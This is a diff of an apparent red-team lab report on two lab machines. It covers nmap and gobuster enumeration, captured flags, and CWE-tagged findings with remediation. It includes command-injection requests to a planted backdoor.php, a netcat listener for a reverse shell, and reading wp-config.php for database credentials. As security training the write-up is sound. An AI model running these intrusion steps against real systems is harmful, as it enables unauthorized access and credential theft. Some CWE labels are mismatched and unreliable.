@@ -12,6 +12,7 @@ Nmap scan results for each machine reveal services and OS details.
 This scan identifies the services below as potential points of entry:
  
 <b> nmap -v -sV -O 192.168.1.110 </b>
+
 - Target 1: List of Exposed Services
 
  PORT | STATE | SERVICE | VERSION
@@ -23,6 +24,7 @@ This scan identifies the services below as potential points of entry:
 445/tcp | open | netbios-ssn | Samba smbd 3.X - 4.X 
 
 <b> nmap -v -sV -O 192.168.1.115 </b>
+
 - Target 2: List of Exposed Services
 
  PORT | STATE | SERVICE | VERSION
@@ -35,7 +37,13 @@ This scan identifies the services below as potential points of entry:
 
 <h2>2. Critical Vulnerabilities</h2>
 
-The following vulnerabilities were identified on each target:
+Vulnerabilities were identified on each target using the following commands:
+
+  <b>nmap --script vuln -sV -p80 192.168.1.110</b>
+  
+  <b>nmap --script vuln -sV -p80 192.168.1.115</b>
+  
+  Target 2 returned identical results to Target 1 
 
  <h4> Target 1 and Target 2: List of Critical Vulnerabilities </h4>
 
@@ -111,34 +119,29 @@ CVE REFERENCE | RATING | ISSUE IN BRIEF
  https://vulners.com/zdt/1337DAY-ID-1415 | 0.0 | (selectlang.php) Remote File Inclusion Vulnerability *EXPLOIT* 
  https://vulners.com/zdt/1337DAY-ID-1161 | 0.0 | (upload/xss) Multiple Remote Vulnerabilities *EXPLOIT*
 
-  <b>nmap --script vuln -sV -p80 192.168.1.110</b>
-   ![nmapVulnTarget1](/Images/nmap-vuln_Target1.png)
-
-Target 2 returned identical results to Target 1 
-
-  <b>nmap --script vuln -sV -p80 192.168.1.115</b>
-   ![nmapVulnTarget2](/Images/nmap-vuln_Target2.png)
 
 
 <h2>3. Exploitation Process</h2>
 
 
-The Red Team was able to penetrate both `Target 1` and `Target 2`, and retrieve the following confidential data:
+The Red Team was able to penetrate both Target 1 and Target 2, and retrieve the following confidential data:
 
 <h3>Target 1</h3>
   - flag1 hash value: `b9bbcd33e11b80be759c4e844862482d`
       ![flag1](/Images/flag1-found_Target1.png)
+      
     - **Exploit Used**
-      - (Common Weakness) CWE-540: Inclusion of Sensitive Information in Source Code 
-      - Click SERVICE link > 192.168.1.110/service.html, Right Click, View Source, flag1 is visible in a commented out line below the footer. 
+      (Common Weakness) CWE-540: Inclusion of Sensitive Information in Source Code 
+      Click SERVICE link > 192.168.1.110/service.html, Right Click, View Source, flag1 is visible in a commented out line below the footer. 
       
      REMEDIATION: Source code should be reviewed and all comments removed from production versions of code.
 
   - flag2 hash value: `fc3fd58dcdad9ab23faca6e9a36e581c`
       ![flag2](/Images/flag2-found_Target1.PNG)
+      
     - **Exploit Used**
-      - (Common Weakness) CWE-521: Weak Password Requirements
-      - an easily guessed password for user michael (ssh login),
+      (Common Weakness) CWE-521: Weak Password Requirements
+      an easily guessed password for user michael (ssh login),
       michael@target1:/var/www/html/wordpress$ 'cat wp-config.php'
       
     REMEDIATION: Enforcement of password policy on the machine.
@@ -150,7 +153,7 @@ The Red Team was able to penetrate both `Target 1` and `Target 2`, and retrieve 
 
       Identified wordpress installed through testing links on homepage; BLOG directs to  192.168.1.110/wordpress
       ![BLOG](/Images/BLOG_Target1.png)
-      This page has a Log in link
+      This page has a Login link
       ![loginURL](/Images/Login_URL_Target1.png)
       ![wp-login](/Images/wp-login_Target1.png)
       
@@ -161,8 +164,9 @@ The Red Team was able to penetrate both `Target 1` and `Target 2`, and retrieve 
 
   - flag3 hash value: `afc01ab5650591e7dccf93122770cd2`
       ![flag3](/Images/flag3-detail_Target1.png)
+      
     - **Exploit Used**
-      - (Common Weakness) CWE-260: Password in configuration file
+      (Common Weakness) CWE-260: Password in configuration file
       wp-config.php contained DB_NAME, DB_USER, DB_PASSWORD for root user in clear text
       ![wp-config.php]/images/wp-config_Target1.PNG
       
@@ -223,9 +227,11 @@ The Red Team was able to penetrate both `Target 1` and `Target 2`, and retrieve 
 
       - flag4 hash value: `715dea6c055b9fe3337544932f2941ce`
       ![found4](/Images/flag4-found_Target1.png)
+      
     - **Exploit Used**
-      - (Common Weakness) CWE-250: Execution with Unnecessary Privileges
+      (Common Weakness) CWE-250: Execution with Unnecessary Privileges
       User steven has excessive privileges
+      
       ![excess-priv](/images/sudo-steven_Target1.PNG)
       
     REMEDIATION: The principle of least privilege should be enforced.
@@ -235,9 +241,11 @@ The Red Team was able to penetrate both `Target 1` and `Target 2`, and retrieve 
 <h3>Target 2</h3>
   - flag1 hash value: `a2c1f66d2b8051db3a5874b5874b5b6e43e21`
       ![found1-T2](/Images/flag1-found_Target2.png)
+      
     - **Exploit Used**
-      - (Common Weakness) CWE-548: Information leakage through directory listing
-      - 'gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u 192.168.1.115'
+      (Common Weakness) CWE-548: Information leakage through directory listing
+      <b>'gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u 192.168.1.115'</b>
+      
     ![gobuster](/Images/gobuster_Target2.png)
     
     Browsing the directories discovered I found flag1 at 192.168.1.115/vendor/PATH (/var/www/html/vendor)
@@ -255,15 +263,17 @@ The Red Team was able to penetrate both `Target 1` and `Target 2`, and retrieve 
       </Directory>
 
   - flag2 hash value: `6a8ed560f0b5358ecf844108048eb337`
+  
       ![found2-T2](/Images/flag2-found_Target2.PNG)
+      
     - **Exploit Used**
-      - (Common Weakness) CWE-78: Improper Sanitization of Special Elements used in an OS Command
-      - '192.168.1.115/backdoor.php?cmd=find+/var/www+-type+f+iname+'flag*''      
+      (Common Weakness) CWE-78: Improper Sanitization of Special Elements used in an OS Command
+      <b>'192.168.1.115/backdoor.php?cmd=find+/var/www+-type+f+iname+'flag*''</b>    
       ![findflags](/Images/find-flags_Target2.PNG)
       
        (The path to flag3 is also disclosed here)
 	   
-      - '192.168.1.115/backdoor.php?cmd=cat+/var/www/flag2.txt'
+      <b>'192.168.1.115/backdoor.php?cmd=cat+/var/www/flag2.txt'</b>
       
     REMEDIATION: Proper input controls within the application would prevent the execution of this exploit. 
      
@@ -274,17 +284,20 @@ The Red Team was able to penetrate both `Target 1` and `Target 2`, and retrieve 
     ![backdoor.php](/Images/edited-exploit_Target2.png)
     
     Prior to execution, establish a netcat session: <b>'nc -lvnp 4444'</b>
-     <b>'./exploit.sh'</b>
+     then run the exploit <b>'./exploit.sh'</b>
      
     ![runExploit](/Images/run-exploit_Target2.png)
     
     We now have a command injection script (backdoor.php) on Target 2 that is accessible via browser.
 
   - flag3 hash value: `a0f568aa9de277887f37730d71520d9b`
+  
      ![flag3-T2](/Images/flag3-found_Target2.PNG)
+     
     - **Exploit Used**
-      - (Common Weakness) CWE-522: Local file inclusion
-      - '192.168.1.115/wordpress/wp-content/uploads/2018/11/flag3.png'
+      (Common Weakness) CWE-522: Local file inclusion
+      <b>'192.168.1.115/wordpress/wp-content/uploads/2018/11/flag3.png'</b>
       
       REMEDIATION: Proper access controls should be in place in the content areas.
-       As this is sensitive information, an additional control to restrict access would be preferable, such as data encrytion. 
+       As this is sensitive information, an additional control to restrict access would be appropriate, such as data encrytion. 
+       
